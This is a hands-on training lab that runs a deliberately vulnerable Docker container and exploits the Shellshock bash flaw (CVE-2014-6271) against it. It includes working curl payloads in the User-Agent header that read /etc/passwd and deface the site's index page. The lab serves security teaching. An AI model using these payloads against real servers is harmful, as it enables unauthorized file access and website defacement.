# Vulnerable Libraries

> Some containers that are often used and available on `DockerHub` are not updated regularly, which results in them having vulnerable packages and libraries. Shellshock(Bashdoor) is one such vulnerability found in older versions of bash that haven't been updated.

### **Lab Image : Containers**

* Step 1: Run an image that is vulnerable to ShellShock on the provisioned server

```commandline
docker run -d -it -p 8080:80 vulnerables/cve-2014-6271
```

* Step 2: Open another browser tab, on the address bar, add `:8080` and press `Enter`.

* Step 3: From the terminal exploit the vulnerability and access `/etc/passwd` of the vulnerable container

>> Note: `$(serverip)` will automatically takes your server ip.

```commandline
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://$(serverip):8080/cgi-bin/vulnerable
```

* Step 4: By exploiting ShellShock, deface the website

>> Note: `$(serverip)` will automatically takes your server ip.

```commandline
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1> DEFACED! ;) </h1></body></html>\" > /var/www/index.html'" http://$(serverip):8080/cgi-bin/vulnerable
```

* Step 5: Open another browser tab, on the address bar, add `:8080` and press `Enter`. and check the site.

## Teardown:

* Stop all containers

```commandline
clean-docker
```

---

### Reading Material/References:

* https://nvd.nist.gov/vuln/detail/CVE-2014-6271
* https://hub.docker.com/r/vulnerables/cve-2014-6271/
